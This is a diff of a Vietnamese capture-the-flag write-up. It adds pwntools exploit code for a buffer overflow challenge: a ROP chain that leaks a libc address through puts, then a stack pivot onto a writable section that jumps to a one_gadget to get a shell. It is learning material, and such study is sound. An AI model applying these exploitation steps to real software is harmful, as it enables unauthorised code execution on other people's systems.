@@ -19,7 +19,7 @@ Các gadget trên không đủ để ta xây dựng ROPchain syscall execve. Ch�
 Quay lại mã được dịch ngược ở dạng Assembly thì thấy `mov rdi, rax`. Và dùng `puts` in dữ liệu trong rdi ra màn hình.
 Mà nhờ có gadget kiểm soát rax và No PIE mà ta có thể in địa chỉ libc trong binary.
 
-Payload:
+Nhập vào Stack:
 
 <img width="1595" height="916" alt="image" src="https://github.com/user-attachments/assets/09c98122-d2a8-4ea8-8238-ddc6e8bd1d19" />
 
@@ -29,3 +29,35 @@ Payload:
 - exe.got['puts']
 - exe.sym['main']+29 : Quay về main để gọi `puts` leak libc
 
+Payload:
+
+    pop_rax=0x0000000000401148
+    main=0x0000000000401258
+    rw_section=0x4040d8
+    
+    payload=b'A'*56
+    payload+=p64(0)
+    payload+=p64(rw_section)
+    payload+=p64(pop_rax)
+    payload+=p64(exe.got['puts']-0x2ecb)      //chống gadget bẩn phá địa chỉ
+    payload+=p64(exe.sym['main']+29)
+  
+    p.sendlineafter(b'Data:',payload)
+    p.recvuntil(b'Thank for playing :)\n')
+    libc_leak=u64(p.recvline()[:-1]+b'\x00\x00')
+    libc.address=libc_leak-0x80e10
+
+## Stack pivot
+<img width="951" height="800" alt="image" src="https://github.com/user-attachments/assets/4ac084e2-0697-4d54-913a-7628d0d398db" />
+
+Lúc này rbp đã đang ở vùng nhớ `rw-`. Dùng `fgets` ghi đè vào sao cho khi *Stack pivot* thì rsp nhảy đến ngay lệnh khai thác.
+
+Payload:
+
+    one_gadget=libc.address+0xebd03
+    
+    payload=b'A'*56
+    payload+=p64(0)
+    payload+=p64(rw_section)
+    payload+=p64(one_gadget)
+    p.sendlineafter(b'Data:',payload)
